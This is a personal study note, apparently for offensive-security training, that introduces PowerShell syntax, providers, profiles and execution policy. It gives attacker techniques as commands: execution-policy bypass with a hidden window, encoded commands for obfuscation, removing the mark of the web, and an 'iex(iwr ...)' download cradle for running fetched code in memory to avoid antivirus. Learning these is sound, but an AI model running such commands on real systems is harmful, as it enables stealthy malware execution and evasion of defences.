## Intro to PS 
- Powershell is object oriented , means that the output are also objects , if you want to prepare a ps script you dont have to trim the unwanted part like we used to do in bash scripting . the outputs are objects  
- powershell is cross platform
- remote execution 
- built in objects for .net , com , wmi , xml and active directory
- you can build modules for powershell and we can also import other people modules , 
>2016 > v5+ windows powershell
>2018 > v6 powershell core 
>2020 > v7 powershell 

windows cames with windows powershell we can also download powershell side by side bcz of different executables they contain in them  
note: if you discover that your VM is restarting due to microsoft licence server , you can disable the windows license manager service 
```
Start-Service webclient;

\\live.sysinternals.com\tools\PsExec.exe -accepteula -i -d -s sc config "wlms" start=disabled
```
make sure you have network connetivity 
## Powershell Fundamentals 
### syntax
-  The typical cmdlet in powershell is constructed using a verb-noun format. For example, the Get-Help command is used to get help about a particular cmdlet. Some of the most common verbs used include the following:

- Get — To get something `get-verb` will print all the verb 
- Start — To run something
- Out — To output something
- Stop — To stop something that is running
- Set — To define something
- New — To create something
### Powershell Providers 
#providers 
- powershell have providers which give access to data stores or drives .
- if you run the command `get-psprovider` it will list all the providers and there respective drives to access . these drives are what we are calling data storage location like we have a default location where our program data and other os related files are stored  `C:\   drive  . 
- it provides a way to interact with different types of data as if they were file system  

lets discuss some of the drives that different ps providers provide 
![[Pasted image 20240707163408.png]]
here are some of the providers .
     
- *filesystem*   : notice  we have been using C: drive and we havent know that this drive we access is through a provider called FileSystem . this image shows us that filesystem provider provides two drive c and d  ^FS
- *registry* : provide HKLM, HKCU . we have an application to edit or peek into registory but we can do the same by using providers to access the drive HKLM and HKSU  ^reg
- *alias* : contain the shortcut to those heavy commands like ls , dir are alias of get-childitem which is a ps command to list the child items of the current directory and the short form of get-childitem is gci its also an alias to get-childitems ^alias
      `set-alias alias-name cmdlet`  will create an alias for us for this session if you want that alias to persist you have to add that alias to the you profile
      `remove-item alias:alias-name`  to remove the alias or remove any item . there is no delete verb in ps there is remove 
      
- *environment* : contains environment variable . *note* > the env variable are not global means that we cannot print them from anywhere .we have to specify the whole path to print them . ^env
    `$env:variable-name` to print the variable the env is the drive name 
- *variable*: conatains global variable . Same as bash scripting we can call variable with $ sign there are built in or predifined variables that contian information like = `$psversiontable` will print the current version of powershell . these are global so we can print them anywhere ^var
- *functions* : as the name suggest it contains function . there is a difference in cmdlet and functions in powershell . **cmdlet are .NET  compiled executables follow the verb-noun syntax see [[#syntax]] ** and **function are powershell scripts** ^func
![[Pasted image 20240707170255.png]] ^194902

### getting help 
we can get help of any cmdlet with command 
`get-help 'cmdlet' args`
`get-help get-psprovider -full` > provides full help to that command 
`get-help get-psprovider -example` > to know the examples of this command 
ps have  a concept that if you run a command and pass a arg then those arg which are not related to it will not work in that command so the same cmdlet can be used in different ways by providing different args to it so its like if you choose a branch of a tree there are only some paths to go to the actual leaf . so you have limited options . so depending or args you start narrowing yourself to a perticular path 

### multiline commands
 \`  if there is  a back tick it means the command is not completed and | , " works the same way 
  *note* : | symbol is also used to take input from the another command output 

### Powershell profile 
powershell profile are powershell scripts which is executed when that perticular user open powershell . we can define our own aliases there , we can do all sort of stuff there which we do in normal ps session  
`$profile` will print the path to the the profile of the current user which is by default empty 

### Execution policy 
in some enterprise version of windows there is a execution policy set to by default to not run powershell script .  
to run a script without any restruction to run the powershell script 
`powershell -exec bypass -file pathtothepowershellscript ` 
`powershell -exec bypass -noprofile -file pathtothepowershellscript` - no profile related alias variables and other things will be used while running this script 
`powershell -exec bypass -windowstyle hidden -file pathtothepowershellscript` - this -windowstyle option is very much used by the attacker which hide the powershell window and execute the script there will be no session history to trck down which commnd was used . very usefull for me ...... ^attacker
### Encoded command 
powershell supports encoded commands . 
```
powershell -encodedcommand <encoded command >
``` 
we have to encode that into utf-16LE for this command to work
this is also used to obfuscate the command . this functionality is used by attackers a lot ^attacker

### Execution policy 
when we download a scirpt from the web the os will put a **"mark of the web"** to that script to know that this script is downloaded and when you run that script powershell will give an error message **this script is not digitally signed **

`unblock-file <script>` - will remove the mark of the web from that file 

### Download Credels
download credels  allows to download something from the internet  and run it directly  in memory . this makes things fast but attacker use this so that there script or malware will not write to the file system where they are likely to be cought or inspected by antivirous ^attacker
```
invoke-Expression(invoke-webrequest <link to the file to download>)
```
the above command will run and download it with internet explorer engine . if you havent opened internet explorer it will give an error . so just use this option 
```
invoke-exrepssion(invoke-webrequest <link> -usebasicparsing)
```
aliases
```
iex(iwr <link> -usebasicparsing)
```

if we have ssl/tls error regarding trust issues we can use => [[Windows File Transfer Methods#Common Errors with PowerShell]]

if we dont have **powershell 3.0+** . we will not have **invoke-webrequest** . we can use another method to download something from the internet => [[Windows File Transfer Methods#File Download]]
